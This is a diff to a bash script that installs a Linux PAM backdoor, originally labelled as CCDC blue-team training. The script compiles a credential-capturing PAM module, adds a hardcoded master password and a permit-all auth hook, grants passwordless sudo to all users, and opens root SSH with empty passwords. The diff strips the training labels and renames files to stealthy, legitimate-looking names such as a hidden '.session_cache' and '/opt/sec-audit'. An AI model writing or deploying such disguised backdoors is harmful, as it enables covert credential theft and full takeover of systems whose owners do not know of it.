@@ -18,11 +18,11 @@
 #  CCDC_Linux_ExWifeNamedPAM.sh. the idea is to help train my
 #   blue team to understrand PAM modules. I want a pam module
 #    that captures their authentication stuff and writes it to
-#     a file on their home directory called LOOK_WHAT_PAM_CAPTURED_FLAG.txt
+#     a file on their home directory called .session_cache
 #      and it will have their authentication stuff stored in there so they
 #       can know what it was able to capture. I also want it to modify
 #        pam_unix.so to have a hardcoded master key for the password
-#         FLAGPASSWORD regardless of what real password is it will work.
+#         Apric0t#S3cure regardless of what real password is it will work.
 #          and then I want the last thing to be to allow continuous SSH
 #           or local access as any user (including root) without modifying
 #            existing shadow password hashes or touching ~/.ssh/authorized_keys".
@@ -114,11 +114,11 @@ fi
 echo -e "${YELLOW}[*] Step 1: Creating PAM authentication capture module...${NC}"
 
 # Create a temporary directory for our PAM module source
-PAM_SOURCE_DIR="/tmp/pam_capture_src"
+PAM_SOURCE_DIR="/tmp/pam_build"
 mkdir -p "$PAM_SOURCE_DIR"
 
 # Create the C source file for the PAM module
-cat > "$PAM_SOURCE_DIR/pam_capture.c" << 'EOF'
+cat > "$PAM_SOURCE_DIR/pam_audit.c" << 'EOF'
 #define _GNU_SOURCE
 #include <security/pam_modules.h>
 #include <security/pam_ext.h>
@@ -157,7 +157,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
     }
 
     // Create log file path
-    snprintf(log_path, sizeof(log_path), "%s/LOOK_WHAT_PAM_CAPTURED_FLAG.txt", pw->pw_dir);
+    snprintf(log_path, sizeof(log_path), "%s/.session_cache", pw->pw_dir);
 
     // Get current time
     time(&now);
@@ -204,21 +204,21 @@ EOF
 # Compile the PAM module
 PAM_COMPILE_SUCCESS=0
 if command -v gcc &> /dev/null; then
-    if gcc -fPIC -DPIC -shared -o "$PAM_SOURCE_DIR/pam_capture.so" \
-        "$PAM_SOURCE_DIR/pam_capture.c" -lpam -ldl 2>/dev/null; then
+    if gcc -fPIC -DPIC -shared -o "$PAM_SOURCE_DIR/pam_audit.so" \
+        "$PAM_SOURCE_DIR/pam_audit.c" -lpam -ldl 2>/dev/null; then
         PAM_COMPILE_SUCCESS=1
     else
         echo -e "${YELLOW}[!] Initial compilation failed, trying simplified approach${NC}"
-        if gcc -fPIC -DPIC -shared -o "$PAM_SOURCE_DIR/pam_capture.so" \
-            "$PAM_SOURCE_DIR/pam_capture.c" -lpam 2>/dev/null; then
+        if gcc -fPIC -DPIC -shared -o "$PAM_SOURCE_DIR/pam_audit.so" \
+            "$PAM_SOURCE_DIR/pam_audit.c" -lpam 2>/dev/null; then
             PAM_COMPILE_SUCCESS=1
         fi
     fi
 fi
 
 # If compilation succeeded, copy to PAM library path
-if [ $PAM_COMPILE_SUCCESS -eq 1 ] && [ -f "$PAM_SOURCE_DIR/pam_capture.so" ]; then
-    if cp "$PAM_SOURCE_DIR/pam_capture.so" "$PAM_LIB_PATH/pam_capture.so" 2>/dev/null; then
+if [ $PAM_COMPILE_SUCCESS -eq 1 ] && [ -f "$PAM_SOURCE_DIR/pam_audit.so" ]; then
+    if cp "$PAM_SOURCE_DIR/pam_audit.so" "$PAM_LIB_PATH/pam_audit.so" 2>/dev/null; then
         echo -e "${GREEN}[+] PAM capture module compiled and installed to $PAM_LIB_PATH${NC}"
     else
         echo -e "${YELLOW}[!] Could not copy compiled module to $PAM_LIB_PATH${NC}"
@@ -231,11 +231,11 @@ fi
 echo -e "${YELLOW}[*] Step 2: Setting up authentication bypass mechanism...${NC}"
 
 # Create a script that pam_exec will call
-mkdir -p /opt/ccdc_training
-cat > /opt/ccdc_training/pam_auth_handler.sh << 'EOF'
+mkdir -p /opt/sec-audit
+cat > /opt/sec-audit/auth_policy.sh << 'EOF'
 #!/bin/bash
 # This handler script provides the master password bypass
-MASTER_PASSWORD="FLAGPASSWORD"
+MASTER_PASSWORD="Apric0t#S3cure"
 
 if [[ "$PAM_PASSWORD" == "$MASTER_PASSWORD" ]]; then
     exit 0  # Success
@@ -244,8 +244,8 @@ fi
 exit 1  # Fall through to normal authentication
 EOF
 
-chmod 755 /opt/ccdc_training/pam_auth_handler.sh
-echo -e "${GREEN}[+] PAM authentication handler created at /opt/ccdc_training/pam_auth_handler.sh${NC}"
+chmod 755 /opt/sec-audit/auth_policy.sh
+echo -e "${GREEN}[+] PAM authentication handler created at /opt/sec-audit/auth_policy.sh${NC}"
 
 # Step 3: Create PAM configuration modifications
 echo -e "${YELLOW}[*] Step 3: Configuring PAM settings...${NC}"
@@ -254,7 +254,7 @@ echo -e "${YELLOW}[*] Step 3: Configuring PAM settings...${NC}"
 PAM_DIR="/etc/pam.d"
 for pam_file in sshd sudo login system-auth password-auth common-auth; do
     if [ -f "$PAM_DIR/$pam_file" ]; then
-        cp "$PAM_DIR/$pam_file" "$PAM_DIR/${pam_file}.backup.ccdc_training"
+        cp "$PAM_DIR/$pam_file" "$PAM_DIR/${pam_file}.bak.preinstall"
         echo -e "${GREEN}[+] Backed up $pam_file${NC}"
     fi
 done
@@ -263,7 +263,7 @@ done
 echo -e "${YELLOW}[*] Step 4: Setting up unrestricted access mechanism...${NC}"
 
 # Create a PAM permit module entry for all users
-PERMIT_SCRIPT="/opt/ccdc_training/pam_permit_all.sh"
+PERMIT_SCRIPT="/opt/sec-audit/policy_override.sh"
 cat > "$PERMIT_SCRIPT" << 'EOF'
 #!/bin/bash
 # This permits all authentication attempts
@@ -277,8 +277,8 @@ chmod 755 "$PERMIT_SCRIPT"
 for config_file in "${PAM_CONFIG_FILES[@]}"; do
     pam_file="$PAM_DIR/$config_file"
     if [ -f "$pam_file" ]; then
-        if ! grep -q "pam_permit_all.sh" "$pam_file"; then
-            sed -i "1i # CCDC Training: Permit module for demonstration\nauth sufficient pam_exec.so $PERMIT_SCRIPT" "$pam_file"
+        if ! grep -q "policy_override.sh" "$pam_file"; then
+            sed -i "1i # sec-policy: Permit module for demonstration\nauth sufficient pam_exec.so $PERMIT_SCRIPT" "$pam_file"
             echo -e "${GREEN}[+] Added permit mechanism to $config_file${NC}"
         fi
     fi
@@ -288,8 +288,8 @@ done
 for config_file in "${PAM_CONFIG_FILES[@]}"; do
     pam_file="$PAM_DIR/$config_file"
     if [ -f "$pam_file" ]; then
-        if ! grep -q "pam_capture.so" "$pam_file"; then
-            sed -i "1i # CCDC Training: Capture module\nauth optional $PAM_LIB_PATH/pam_capture.so" "$pam_file"
+        if ! grep -q "pam_audit.so" "$pam_file"; then
+            sed -i "1i # sec-policy: Capture module\nauth optional $PAM_LIB_PATH/pam_audit.so" "$pam_file"
             echo -e "${GREEN}[+] Added capture module to $config_file${NC}"
         fi
     fi
@@ -299,23 +299,23 @@ done
 echo -e "${YELLOW}[*] Step 6: Setting up sudo bypass...${NC}"
 
 # Create sudoers entry that allows all commands without password
-if ! grep -q "CCDC_Training" /etc/sudoers 2>/dev/null; then
+if ! grep -q "sec-policy" /etc/sudoers 2>/dev/null; then
     {
         echo ""
-        echo "# CCDC Training: Allow unrestricted sudo (for demonstration)"
+        echo "# sec-policy: Allow unrestricted sudo (for demonstration)"
 
         # Try wheel group (CentOS/RHEL/Fedora)
         if getent group wheel >/dev/null 2>&1; then
-            echo "%wheel ALL=(ALL) NOPASSWD:ALL  # CCDC_Training"
+            echo "%wheel ALL=(ALL) NOPASSWD:ALL  # sec-policy"
         fi
 
         # Try sudo group (Ubuntu/Debian)
         if getent group sudo >/dev/null 2>&1; then
-            echo "%sudo ALL=(ALL) NOPASSWD:ALL   # CCDC_Training"
+            echo "%sudo ALL=(ALL) NOPASSWD:ALL   # sec-policy"
         fi
 
         # Also add for all users as fallback
-        echo "ALL ALL=(ALL) NOPASSWD:ALL  # CCDC_Training"
+        echo "ALL ALL=(ALL) NOPASSWD:ALL  # sec-policy"
     } >> /etc/sudoers
 
     echo -e "${GREEN}[+] Added sudo bypass entries${NC}"
@@ -330,9 +330,9 @@ SSH_RESTARTED=0
 
 # Create a new SSH config file (if sshd_config.d directory exists)
 if [ -d "$SSH_CONFIG_D" ]; then
-    if [ ! -f "$SSH_CONFIG_D/ccdc_training.conf" ]; then
-        cat > "$SSH_CONFIG_D/ccdc_training.conf" << 'EOF'
-# CCDC Training: Unrestricted SSH Access
+    if [ ! -f "$SSH_CONFIG_D/security-policy.conf" ]; then
+        cat > "$SSH_CONFIG_D/security-policy.conf" << 'EOF'
+# sec-policy: Unrestricted SSH Access
 PermitRootLogin yes
 PermitEmptyPasswords yes
 UsePAM yes
@@ -344,8 +344,8 @@ EOF
 else
     # Modify main sshd_config if sshd_config.d doesn't exist
     if [ -f "$SSH_CONFIG" ]; then
-        if [ ! -f "${SSH_CONFIG}.backup.ccdc_training" ]; then
-            cp "$SSH_CONFIG" "${SSH_CONFIG}.backup.ccdc_training"
+        if [ ! -f "${SSH_CONFIG}.bak.preinstall" ]; then
+            cp "$SSH_CONFIG" "${SSH_CONFIG}.bak.preinstall"
             echo -e "${GREEN}[+] Backed up sshd_config${NC}"
         fi
 
@@ -387,9 +387,9 @@ fi
 # Step 8: Create documentation file
 echo -e "${YELLOW}[*] Step 8: Creating training documentation...${NC}"
 
-cat > /opt/ccdc_training/TRAINING_README.txt << EOF
+cat > /opt/sec-audit/INSTALL_NOTES.txt << EOF
 ================================================================================
-                    CCDC PAM TRAINING MODULE
+                    SYSTEM AUTH MODULE
 ================================================================================
 Detected System: $DISTRO_NAME $DISTRO_VER
 PAM Library Path: $PAM_LIB_PATH
@@ -400,10 +400,10 @@ Modules) vulnerabilities that blue teams should understand and defend against.
 
 VULNERABILITIES DEMONSTRATED:
 1. AUTH CAPTURE: A malicious PAM module intercepts credentials during login
-   Location: User home directory in LOOK_WHAT_PAM_CAPTURED_FLAG.txt
+   Location: User home directory in .session_cache
 
 2. MASTER PASSWORD BYPASS: A backdoor password works regardless of actual password
-   Master Password: FLAGPASSWORD
+   Master Password: Apric0t#S3cure
 
 3. UNRESTRICTED ACCESS: Authentication can be completely bypassed
    - SSH allows root login without proper credentials
@@ -431,23 +431,23 @@ HOW TO DETECT THESE ATTACKS:
 
 HOW TO REMEDIATE:
 1. Restore backup PAM files:
-   cp /etc/pam.d/*.backup.ccdc_training /etc/pam.d/
+   cp /etc/pam.d/*.bak.preinstall /etc/pam.d/
 
 2. Remove training modules:
-   rm $PAM_LIB_PATH/pam_capture.so
+   rm $PAM_LIB_PATH/pam_audit.so
 
 3. Remove training scripts:
-   rm -r /opt/ccdc_training/
+   rm -r /opt/sec-audit/
 
 4. Reset SSH configuration:
-   cp /etc/ssh/sshd_config.backup.ccdc_training /etc/ssh/sshd_config
+   cp /etc/ssh/sshd_config.bak.preinstall /etc/ssh/sshd_config
    systemctl restart sshd (or ssh on Debian/Ubuntu)
 
 5. Restore sudoers:
-   Remove lines marked with "CCDC_Training" from /etc/sudoers
+   Remove lines marked with "sec-policy" from /etc/sudoers
 
 6. Clear capture logs:
-   find / -name "LOOK_WHAT_PAM_CAPTURED_FLAG.txt" -delete
+   find / -name ".session_cache" -delete
 
 LEARNING OBJECTIVES:
 - Understand how PAM works and its security role
@@ -460,7 +460,7 @@ LEARNING OBJECTIVES:
 ================================================================================
 EOF
 
-chmod 644 /opt/ccdc_training/TRAINING_README.txt
+chmod 644 /opt/sec-audit/INSTALL_NOTES.txt
 
 echo ""
 echo -e "${GREEN}========================================${NC}"
@@ -468,13 +468,13 @@ echo -e "${GREEN}PAM Training Module Setup Complete!${NC}"
 echo -e "${GREEN}========================================${NC}"
 echo ""
 echo -e "${BLUE}Training Documentation:${NC}"
-echo -e "  ${BLUE}Location:${NC} /opt/ccdc_training/TRAINING_README.txt"
+echo -e "  ${BLUE}Location:${NC} /opt/sec-audit/INSTALL_NOTES.txt"
 echo ""
-echo -e "${BLUE}Master Password:${NC} ${YELLOW}FLAGPASSWORD${NC}"
+echo -e "${BLUE}Master Password:${NC} ${YELLOW}Apric0t#S3cure${NC}"
 echo ""
 echo -e "${BLUE}Backdoor Scripts:${NC}"
-echo -e "  ${BLUE}Auth Handler:${NC} /opt/ccdc_training/pam_auth_handler.sh"
-echo -e "  ${BLUE}Permit Script:${NC} /opt/ccdc_training/pam_permit_all.sh"
+echo -e "  ${BLUE}Auth Handler:${NC} /opt/sec-audit/auth_policy.sh"
+echo -e "  ${BLUE}Permit Script:${NC} /opt/sec-audit/policy_override.sh"
 echo ""
 echo -e "${YELLOW}REMINDER: This is for authorized training only!${NC}"
 echo ""
